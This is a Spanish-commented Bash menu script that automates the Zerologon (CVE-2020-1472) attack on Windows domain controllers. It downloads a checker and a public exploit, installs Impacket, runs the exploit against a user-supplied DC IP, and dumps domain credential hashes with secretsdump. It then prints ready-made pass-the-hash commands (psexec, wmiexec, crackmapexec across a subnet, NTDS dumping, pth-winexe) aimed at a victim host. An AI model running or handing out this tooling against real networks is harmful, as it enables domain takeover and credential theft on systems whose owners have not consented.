#!/bin/bash

opcion="ninguna"

# Instalacion del checker 
function opcion1
{
	git clone https://github.com/SecuraBV/CVE-2020-1472.git
	cd CVE-2020-1472/
	pip3 install -r requirements.txt

	echo ""
	echo "Se intalo Correctamente"
	echo ""
	read -rsp $'Press enter to continue...\n'
	cd ..
}

# Ejecucion del checker para saber si el sistema op victima es vulnerable a zerologon
function opcion2
{

echo ""
echo "*                                                                 *"
echo "* Ingrese la IP del Servidor de Dominio Ejemplo: 192.168.1.100    *"
echo "*                                                                 *"
echo ""
read ipdc

echo ""
echo "*                                                                   *"
echo "* (DC-Name) o Nombre del Servidor : RAGNAR			  *"
echo "*                                                                   *"
echo ""
read nombredc

	cd CVE-2020-1472/
	echo ""
	python3 zerologon_tester.py $nombredc $ipdc
	echo ""
	read -rsp $'Press enter to continue...\n'
	cd ..
}

# Descarga de utilidades para la explotacion
# Instalacion de Virtualenv - Impacket y el Exploit de zerologon
function opcion3
{
	git clone https://github.com/pypa/virtualenv.git
	cd virtualenv
	pip3 install virtualenv
	virtualenv zerologon
	source zerologon/bin/activate

	cd ..
	git clone https://github.com/SecureAuthCorp/impacket
	cd impacket/
	pip3 install -r requirements.txt
	python3 setup.py install
	cd ..

	mkdir exploit
	cd exploit
	git clone https://github.com/dirkjanm/CVE-2020-1472.git
        cd CVE-2020-1472
	cd ..
	read -rsp $'Press enter to continue...\n'
}

# Se ejecuta el exploit y se obtienen los Hashes que posteriormente podremos usar para hacer pass the hash
# se puede usar (pth-winexec)
# o tambien (exploit/windows/smb/psexec)
function opcion4
{
echo ""
echo "*                                                *"
echo "* IP del Servidor (DC) Ejemplo: 192.168.1.100    *"
echo "*                                                *"
echo ""
read ipdc

echo ""
echo "*                                                              *"
echo "* (DC-Name) Nombre del Servidor de Dominio Ejemplo: RAGNAR     *"
echo "*                                                              *"
echo ""
read nombredc

echo ""

echo "*                                                                              *"
echo "* Ingrese el nombre del Dominio (DC-Name) IP de Red Ejemplo: evilcorp.local    *"
echo "*                                                                              *"
echo ""
read dominio

echo ""
cd virtualenv
virtualenv zerologon
source zerologon/bin/activate
cd ..
cd exploit/CVE-2020-1472
python3 cve-2020-1472-exploit.py $nombredc $ipdc
echo ""

#secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr' Ejemplo
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 $dominio/$nombredc\$@$ipdc


echo ""
echo -e " \e[31m Ahora use pth-winexe o exploit/windows/smb/psexec (Para hacer Pass The Hash) \e[0m :)"
echo -e " \e[31m Copie lo Hashes Rapido!!!  \e[0m XD"
echo ""
echo -e "	A continuacion unos ejemplos"
echo ""
echo -e "\e[33m exploit/windows/smb/psexec \e[0m"
echo -e "\e[33m python3 psexec.py RAGNAR/Administrador:Passwd@<IP_Victima> cmd.exe \e[0m"
echo -e "\e[33m wmiexec.py -hashes :e2a9c79e48c89c6db3b256a063f86bbb Administrador@<IP_Victima> \e[0m"
echo -e "\e[33m crackmapexec smb <IP_Victima> -u 'Administrador' -H 'e2a9c79e48c89c6db3b256a063f86bbb' --sam \e[0m"
echo -e "\e[33m crackmapexec smb 192.168.1.0/24 -u 'Administrador' -H 'e2a9c79e48c89c6db3b256a063f86bbb' \e[0m"
echo -e "\e[33m crackmapexec smb <IP_Victima> -u 'Administrador' -p 'PASSWD' --ntds vss \e[0m"
echo -e "\e[33m pth-winexe -U RAGNAR/Administrador%aad3b435b51404eeaad3b435b51404ee:e2a9c79e48c89c6db3b256a063f86bbb //<IP_Victima> cmd.exe \e[0m"

read -rsp $'Press enter to continue...\n'

}

while [ $opcion != "5"  ]
    do

	#Banner
	echo ""
	echo "		▒███████▒▓█████  ██▀███   ▒█████   ██▓     ▒█████    ▄████  ▒█████   ███▄    █ 	"
	echo "		▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▒██▒  ██▒ ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █ 	"
	echo "		░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░  ██▒▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒	"
	echo "		  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░▒██░    ▒██   ██░░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒	"
	echo "		▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░░██████▒░ ████▓▒░░▒▓███▀▒░ ████▓▒░▒██░   ▓██░	"
	echo "		░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▒░▒░  ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 	"
	echo "		░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░  ░ ▒ ▒░   ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░	"
	echo "		░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒    ░ ░   ░ ░ ░ ▒  ░ ░   ░ ░ ░ ░ ▒     ░   ░ ░ 	"
	echo "		  ░ ░       ░  ░   ░         ░ ░      ░  ░    ░ ░        ░     ░ ░           ░ 	"
	echo "		░                                                                              	"
	echo ""

	echo "                                                                                                     "
	echo "                                  [Created By Anonimo501]                                            "
	echo "                            [https://youtube.com/c/Anonimo501]                                       "
	echo "                                                                                                     "
	echo "                              Hola bienvenid@s a zerologon                                           "
	echo "                                        	                                                           "
	echo -e " \e[33m ADVERTENCIA: NO ejecute el script si no tiene un backup del DC/AD ya que el ataque puede causar problemas \e[0m"

	echo -e "\e[31m \nMenu \e[0m"
	echo -e "\e[33m \t1) \e[0m Descargar Checker"
	echo -e "\e[33m \t2) \e[0m Ejecucion De Script Checker"
        echo -e "\e[33m \t3) \e[0m Descarga el exploit y otras utilidades"
        echo -e "\e[33m \t4) \e[0m Ejecutar Exploit - Obtencion de Hashes"
	echo -e "\e[33m \t5) \e[0m Salir\n"
	echo -e "\e[33m \tOpcion: \e[0m \c "

	read opcion

        if [ -z $opcion ] ; then opcion="ninguna" ; fi

        case $opcion in
		"1" )
                      opcion1
  		      ;;
		"2" )
		      opcion2
		      ;;
                "3" )
                      opcion3
                      ;;
                "4" )
                      opcion4
                      ;;
		"*" )
		      ;;

	esac


	/usr/bin/clear
done
